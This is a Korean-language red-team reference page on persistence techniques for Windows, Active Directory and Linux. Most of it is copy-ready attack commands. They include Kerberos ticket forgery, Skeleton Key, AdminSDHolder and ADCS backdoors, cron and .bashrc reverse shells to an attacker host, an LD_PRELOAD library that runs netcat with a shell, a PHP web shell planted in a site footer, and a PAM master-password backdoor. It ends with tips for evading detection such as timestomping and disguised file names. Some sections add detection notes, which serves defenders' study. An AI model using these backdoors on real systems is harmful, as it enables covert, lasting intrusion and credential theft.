# Persistence

블루팀이 implant 하나 잡아도 다시 들어올 수 있는 두 번째, 세 번째 백도어를 심어 두는 단계.

실무에서는 "다양성" 이 핵심 — Registry Run 하나, Scheduled Task 하나, AD object 하나 이런 식으로 서로 다른 계층에 분산시켜 둔다.

---

## Windows Persistence

### 레지스트리 Run Key

시스템 시작 시 프로그램을 자동 실행하도록 레지스트리에 등록한다.

```powershell
# 현재 사용자 (HKCU) - 관리자 권한 불필요
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<payload_path>" /f

# 모든 사용자 (HKLM) - 관리자 권한 필요
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<payload_path>" /f
```

### Startup 폴더

```powershell
# 현재 사용자
copy <payload> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# 모든 사용자
copy <payload> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

!!! warning "탐지"
    Registry Run Key: Sysmon Event 13 (Registry Value Set). Startup 폴더: Sysmon Event 11 (File Create). 모두 EDR에서 기본 모니터링 대상.

```powershell
# 작업 생성
schtasks /create /tn "<task_name>" /tr "<payload_path>" /sc onlogon /ru SYSTEM

# 주기적 실행
schtasks /create /tn "<task_name>" /tr "<payload_path>" /sc minute /mo 30

# 작업 확인
schtasks /query /tn "<task_name>"

# 작업 삭제
schtasks /delete /tn "<task_name>" /f
```

!!! warning "탐지"
    Event 4698 (Scheduled Task Created), Sysmon Event 1 (Process Create) 발생. SYSTEM 권한 작업은 특히 주의.

```powershell
# 서비스 생성 (SYSTEM 권한으로 실행)
sc create <svc_name> binpath= "<payload_path>" start= auto
sc start <svc_name>
```

!!! warning "탐지"
    Event 7045 (새 서비스 설치), Event 4697 (서비스 설치 로그). 이름과 바이너리 경로가 기록된다.

```powershell
# WMI를 통한 지속적 코드 실행 (관리자 권한 필요)
# __EventFilter (트리거 조건)
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "UpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# CommandLineEventConsumer (실행할 명령)
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "UpdateConsumer"
    CommandLineTemplate = "C:\Windows\System32\cmd.exe /c C:\temp\payload.exe"
}

# __FilterToConsumerBinding (연결)
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```
!!! warning "탐지"
    WMI Subscription: Sysmon Event 19/20/21 (WMI Filter/Consumer/Binding). `root\subscription` 네임스페이스 모니터링으로 탐지 가능.
```powershell
# WMI Subscription 확인 / 제거
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

### Golden Ticket

도메인의 krbtgt 계정 해시를 획득하면 임의의 TGT를 위조할 수 있다. krbtgt 패스워드가 변경되지 않는 한 영구적으로 유효하다.

```bash
# krbtgt 해시 획득 (DCSync)
impacket-secretsdump '<domain>/<admin>:<pass>@<dc_ip>' -just-dc-user krbtgt
```

```bash
# Impacket으로 Golden Ticket 생성
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> \
  -domain <domain> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<dc_fqdn> -k -no-pass
```

!!! warning "탐지"
    Golden Ticket은 TGT 수명(기본 10시간)을 초과하는 티켓으로 탐지 가능. Event 4769에서 비정상 SID/도메인 조합 확인.

### Silver Ticket

특정 서비스 계정의 NTLM 해시로 해당 서비스에 대한 TGS를 위조하는 기법. Golden Ticket과 달리 KDC를 경유하지 않으므로 탐지가 어렵다.

```bash
# Impacket
impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-... \
  -domain domain.local -spn cifs/target.domain.local administrator
export KRB5CCNAME=administrator.ccache

# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... \
  /target:target.domain.local /service:cifs /rc4:SVC_HASH /ptt

# 주요 SPN 예시
# cifs/target  → SMB 접근
# HTTP/target  → WinRM/WMI
# MSSQLSvc/target:1433 → MSSQL
# HOST/target  → Scheduled Task, WMI
```

### Skeleton Key

DC의 LSASS에 Skeleton Key를 삽입하면 **아무 계정이나 마스터 비밀번호 1개**로 인증 가능. DC 재시작 시 소멸.

```powershell
# Mimikatz (DC에서 실행)
privilege::debug
misc::skeleton

# 이후 임의의 계정에 비밀번호 "mimikatz"로 인증 가능
# 예: 
impacket-psexec domain/administrator:mimikatz@TARGET
```

!!! warning "주의사항"
    - DC의 LSASS 프로세스를 직접 패치하므로 불안정성 유발 가능
    - Credential Guard 활성화 시 불가
    - 단일 DC에만 적용됨 (각 DC마다 실행 필요)

### DSRM (Directory Services Restore Mode)

DC의 로컬 Administrator 계정 (DSRM 계정) 비밀번호를 변경하고, 원격 접근을 허용하여 백도어로 사용.

```powershell
# DSRM 비밀번호 변경
ntdsutil
> set dsrm password
> reset password on server null
> Enter new password

# 레지스트리에서 DSRM 로그온 동작 변경 (원격 접근 허용)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# 값 2 = 네트워크 로그온 허용

# DSRM 해시로 PtH
impacket-secretsdump -just-dc-user "Administrator" TARGET/Administrator@DC_IP
# SAM의 로컬 Administrator 해시 사용
impacket-psexec -hashes :DSRM_HASH administrator@DC_IP
```

### AdminSDHolder

AdminSDHolder의 ACL을 수정하면, SDProp (60분마다 실행)이 모든 Protected Group에 해당 ACL을 전파한다.

```powershell
# AdminSDHolder에 GenericAll 권한 추가 (PowerView)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All

# bloodyAD
bloodyAD -d domain -u admin -p pass --host DC_IP add genericAll \
  'CN=AdminSDHolder,CN=System,DC=domain,DC=local' backdoor_user

# SDProp 강제 실행 (60분 안 기다리려면)
Invoke-ADSDPropagation  # PowerView
```

### SID History Injection

사용자에게 Domain Admin의 SID를 SID History로 추가하면 DA 권한 획득.

```powershell
# Mimikatz (DC에서, 패치 필요)
privilege::debug
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-DOMAIN-512  # 512 = Domain Admins

# Impacket (Golden Ticket + SID History)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \
  -domain domain.local -extra-sid S-1-5-21-TARGET_DOMAIN-519 administrator
```

### Certificate-Based Persistence (ADCS)

인증서의 유효기간이 길어 (기본 1년) 비밀번호 변경 후에도 접근 유지 가능.

```bash
# 사용자/머신 인증서 요청
certipy req -u user@domain -p pass -ca CA-NAME -template User -target DC_IP

# 인증서로 TGT 요청 (비밀번호 변경되어도 유효)
certipy auth -pfx user.pfx -dc-ip DC_IP

# CA 인증서 + 개인키 탈취 → 임의 인증서 발급
certipy ca -backup -u admin@domain -p pass -ca CA-NAME
# → ca.pfx (CA 인증서 + 개인키)
certipy forge -ca-pfx ca.pfx -upn administrator@domain -subject 'CN=Administrator'
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

### GPO (Group Policy Object) Persistence

GPO를 수정하여 시작 시 payload 실행, Scheduled Task 배포 등.

```powershell
# SharpGPOAbuse (GPO 편집 권한 필요)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c C:\temp\payload.exe" \
  --GPOName "Default Domain Policy"

# Immediate Scheduled Task 추가
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" \
  --ScriptContents "C:\temp\payload.exe" --GPOName "TARGET_GPO"

# GPO 강제 업데이트
gpupdate /force
```

---

## Linux Persistence

### SSH Key

```bash
# 공격자의 SSH 공개키를 target에 추가
echo "<attacker_pubkey>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Cron Job

```bash
# reverse shell cron
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'") | crontab -
```

### .bashrc / .profile

```bash
# 로그인 시 reverse shell 실행
echo 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1 &' >> ~/.bashrc
```

### systemd Service

```ini
# /etc/systemd/system/<name>.service
[Unit]
Description=System Update Service

[Service]
ExecStart=/path/to/payload
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable <name>.service
systemctl start <name>.service
```

### SUID Backdoor

```bash
# SUID 백도어 바이너리
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell
# 실행: /tmp/.hidden_shell -p

# 또는 C 컴파일
cat > /tmp/suid.c << 'EOF'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/bash", "bash", "-p", NULL); }
EOF
gcc /tmp/suid.c -o /tmp/.suid && chmod u+s /tmp/.suid
```

### PAM Backdoor

!!! danger "시스템 불안정 위험"
    PAM 설정을 잘못 변경하면 전체 인증이 불가능해질 수 있다. 반드시 원본을 백업하고, 복원 방법을 확보한 상태에서 진행한다.

```bash
# 1. 기존 PAM 모듈 백업
cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak

# 2. pam_unix.so 소스를 수정하여 마스터 비밀번호 추가 (컴파일 필요)
# 또는 간단한 방법: /etc/pam.d/common-auth에 커스텀 모듈 삽입

# 3. 간단한 PAM 백도어 (pam_exec 이용)
cat > /tmp/.auth.sh << 'SCRIPT'
#!/bin/bash
if [ "$PAM_USER" != "" ] && [ "$PAM_AUTHTOK" == "backdoor_pass" ]; then
  exit 0
fi
exit 1
SCRIPT
chmod 755 /tmp/.auth.sh

# /etc/pam.d/common-auth 맨 위에 추가
# auth sufficient pam_exec.so quiet /tmp/.auth.sh

# 4. 복원
# 추가한 줄 삭제 또는 원본 복원
# cp /tmp/pam_unix.so.bak /lib/x86_64-linux-gnu/security/pam_unix.so
```

### Authorized Keys (Forced Command 우회 / 옵션 추가)

```bash
# 옵션을 우회하면서 추가
echo 'no-port-forwarding,no-X11-forwarding command="/bin/bash -i" <attacker_pubkey>' \
  >> ~/.ssh/authorized_keys
# 키만 보고 ACL 검증하는 모니터링은 command 옵션 변경을 놓치는 경우 多

# 루트 키 추가 (root 쓰기 권한 있을 때)
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
```

### systemd Timer (cron 보다 조용함)

```ini
# /etc/systemd/system/sysupd.service
[Unit]
Description=System Update Helper
[Service]
Type=oneshot
ExecStart=/usr/local/sbin/sysupd
```

```ini
# /etc/systemd/system/sysupd.timer
[Unit]
Description=Run sysupd hourly
[Timer]
OnBootSec=5min
OnUnitActiveSec=1h
Unit=sysupd.service
[Install]
WantedBy=timers.target
```

```bash
systemctl daemon-reload
systemctl enable --now sysupd.timer
systemctl list-timers --all | grep sysupd
```

cron 과 달리 **사용자 단위 타이머** (`~/.config/systemd/user/`) 는 더 발견하기 어렵다.

```bash
loginctl enable-linger <user>      # 사용자 로그아웃 후에도 동작
systemctl --user enable --now beacon.timer
```

### LD_PRELOAD 백도어

```bash
# 모든 동적 링크 바이너리가 라이브러리를 먼저 로드 → 후킹
cat > /tmp/hook.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
  if(getuid()==0) system("nc <attacker> 4444 -e /bin/bash &");
}
EOF
gcc -fPIC -shared /tmp/hook.c -o /lib/x86_64-linux-gnu/libsysinit.so

# 영구 로드
echo "/lib/x86_64-linux-gnu/libsysinit.so" > /etc/ld.so.preload
```

!!! danger "LD_PRELOAD"
    `/etc/ld.so.preload` 가 잘못되면 **모든 명령이 실패** → 시스템 복구 불가 위험. 반드시 콘솔/구조 모드 접근 확보 후 진행.

### Web Shell / Webhook (HTTP 백도어)

```bash
# 정상 사이트의 한 페이지에 작은 webhook 추가
echo '<?php if($_GET["k"]=="X"){system($_GET["c"]);} ?>' >> /var/www/html/footer.php
chown www-data:www-data /var/www/html/footer.php

# 또는 /usr/lib/cgi-bin/ 에 .cgi 추가
```

### MOTD / Update Hook

```bash
# /etc/update-motd.d/ 의 스크립트는 SSH 로그인 시 root 로 실행됨
cat > /etc/update-motd.d/00-helper << 'EOF'
#!/bin/sh
( /tmp/.beacon & ) >/dev/null 2>&1
EOF
chmod +x /etc/update-motd.d/00-helper

# /etc/profile.d/ 도 유사 (모든 사용자 로그인 시)
echo 'bash -i >& /dev/tcp/<a>/<p> 0>&1 &' > /etc/profile.d/x.sh
chmod +x /etc/profile.d/x.sh
```

### eBPF / 커널 후킹 (고급)

최신 환경 (kernel 5.x+) 에서 root 권한이 있으면 eBPF 프로그램 / kprobe 로 syscall 후킹.
파일시스템에 흔적이 거의 없어 탐지 난이도 높음.

```bash
# 예: bcc / bpftrace 로 실행 인자 후킹 (학습 목적)
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s\n", str(args->filename)); }'

# 실전 도구
# - boopkit, ebpfkit (rootkit PoC, 학습/리서치 용도만)
```

탐지 측: Falco, Tracee, Tetragon 등 동일 eBPF 기반.

### Linux Capabilities 백도어

```bash
# 특정 바이너리에 cap_setuid 등을 부여 → 일반 사용자가 root 권한 명령 실행
setcap cap_setuid+ep /usr/bin/python3
# 이후
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 발견
getcap -r / 2>/dev/null
```

### Wrapper / Shell Function 후킹 (사용자 환경)

```bash
# alias 또는 function 으로 정상 명령 후킹
echo 'alias sudo="/tmp/.x; sudo"' >> ~/.bashrc
echo 'function ssh(){ /tmp/.log_ssh "$@"; command ssh "$@"; }' >> ~/.bashrc
```

### Cron @reboot / anacron

```bash
(crontab -l 2>/dev/null; echo '@reboot /tmp/.b &') | crontab -
echo '@reboot root /tmp/.b &' >> /etc/crontab

# anacron (장기 슬립 호스트)
echo '1 5 jobname /tmp/.b' >> /etc/anacrontab
```

### Rootkit (LKM)

호스트와 동일 커널 header로 build 필요. 탐지 회피력 가장 높지만 운영 안정성 위험.

```bash
# 학습용 PoC (KoviD, Diamorphine 등)
make
insmod diamorphine.ko
# 모듈/프로세스/포트/파일 숨김 + magic signal 로 root 셸
```

---

## OPSEC / 탐지 회피 노트

| 위치 | 탐지 난이도 | 비고 |
|------|------------|------|
| `~/.ssh/authorized_keys` | 낮음 (대부분 모니터됨) | 옵션 변형으로 일부 우회 가능 |
| `crontab -l` | 낮음 | `/var/spool/cron/` 모니터됨 |
| systemd service | 중 | timer + 일반 명명 권장 |
| systemd user timer + linger | 높음 | 잘 모니터되지 않음 |
| LD_PRELOAD | 중-높음 | `/etc/ld.so.preload` 는 EDR 가 자주 봄 |
| Web Shell | 환경 따라 다름 | 웹로그/IDS 매칭 우선 |
| eBPF | 매우 높음 | 단, EDR 도 eBPF → 충돌 시 탐지 |
| LKM Rootkit | 매우 높음 | 안정성 위험, 인게이지먼트 룰 사전 합의 필요 |

공통 권고:

- 정상 패키지/관리자 도구처럼 보이는 **이름 / 경로** 사용 (`/usr/local/sbin/sysupd`, `update-helper` 등)
- 파일 mtime/atime 을 주변 파일과 맞추기 (`touch -r /etc/hostname x`)
- `auditd` / `journald` 룰 회피를 위해 `setfattr` 으로 audit 무시 속성 설정 (root 필요)
- 작업 종료 후 추가한 모든 항목 **기록 + 정리**

---

!!! info "관련 페이지"
    - Golden/Silver Ticket 상세 → [AD 환경 공격](../ad/ad-environment.md)
    - 탐지 회피 → [방어 우회](../evasion/index.md)
    - credential 획득 → [credential 획득](../lifecycle/credential-access.md)
